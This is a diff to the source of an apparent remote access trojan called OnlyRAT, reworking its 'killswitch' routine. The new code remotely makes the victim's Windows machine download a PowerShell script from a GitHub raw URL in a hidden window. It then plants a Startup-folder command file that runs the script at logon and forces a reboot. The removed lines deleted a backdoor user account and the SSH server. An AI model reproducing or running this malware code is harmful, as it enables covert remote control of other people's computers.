@@ -230,16 +230,22 @@ def grab_webcam(address, password, working, username):
 
 # killswitch
 def killswitch(address, password, working, username):
-    print("\n[*] Formatting killswitch...")
-    delete_working = f"powershell Remove-Item {working}/*"
-    delete_startup = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Remove-Item $env:temp/*; Remove-LocalUser -Name \"onlyrat\"; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item GiLqXiexKP.cmd; >> GiLqXiexKP.cmd"
-    print("[+] Killswitch formatted")
+    print("\n[*] Prepping killswitch...")
+    # web requests
+    killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/TOhjZsWluf.ps1 >> GiLqXiexKP.cmd"
+    print("[+] Killswitch prepped")
 
-    print("[*] Removing working directory...")
-    remote_command(address, password, delete_working)
-    remote_command(address, password, delete_startup)
-    print("[+] Working directory removed")
-    print("[+] OnlyRAT will be removed when the target computer is restarted")
+    # installing keylogger
+    print("[*] Installing killswitch...")
+    remote_command(address, password, killswitch_command)
+    print("[*] Installing controller...")
+    remote_command(address, password, controller_command)
+    print("[+] Killswitch installed sucessfully\n")
+
+    # execute logger
+    print("\n[*] Restarting target computer...")
+    remote_command(address, password, "shutdown /r")
 
 # custom upload
 def upload(address, password, working):
